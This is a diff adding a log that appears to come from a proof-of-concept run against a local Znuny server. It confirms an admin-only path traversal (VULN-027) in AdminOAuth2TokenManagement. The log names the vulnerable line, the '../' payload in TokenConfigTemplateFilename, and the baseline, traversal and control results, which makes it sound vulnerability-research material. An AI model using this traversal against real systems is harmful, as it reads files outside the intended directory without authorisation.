@@ -1,0 +1,15 @@
+==========================================================================
+VULN-027: AdminOAuth2TokenManagement cross-dir *.yml read
+Target: http://localhost:25114
+[INFO] sink: AdminOAuth2TokenManagement.pm:977 FileRead(base.'/'.$Filename.'.yml') — no ../ filter
+[INFO] Subaction=AddTokenConfigByTemplateFile — no ChallengeToken
+==========================================================================
+[SETUP] logging in as admin root@localhost
+[STEP] baseline: TokenConfigTemplateFilename=GoogleMail (inside base dir)
+[PROOF] baseline title -> 'Manage OAuth2 tokens and their configurations. - AdminOAuth2TokenManagement - Znuny'
+[STEP] traversal: TokenConfigTemplateFilename=../oauth2_token_config_example (OUTSIDE base)
+[PROOF] traversal title -> 'Manage OAuth2 tokens and their configurations. - AdminOAuth2TokenManagement - Znuny'; out-of-base marker 'Microsoft Outlook' reflected: True
+[STEP] control: nonexistent ../zzz_c3e3dd22
+[PROOF] control title -> 'Error - AdminOAuth2TokenManagement - Znuny'
+[OK] exploit confirmed — ../oauth2_token_config_example (a .yml OUTSIDE the TokenConfigTemplates base) was read and its content reflected into the Edit form, while a nonexistent path errored — cross-directory *.yml file read as admin (no CSRF token).
+==> VULN-027: CONFIRMED — ../oauth2_token_config_example (a .yml OUTSIDE the TokenConfigTemplates base) was read and its content reflected into the Edit form, while a nonexistent path errored — cross-directory *.yml file read as admin (no CSRF token).
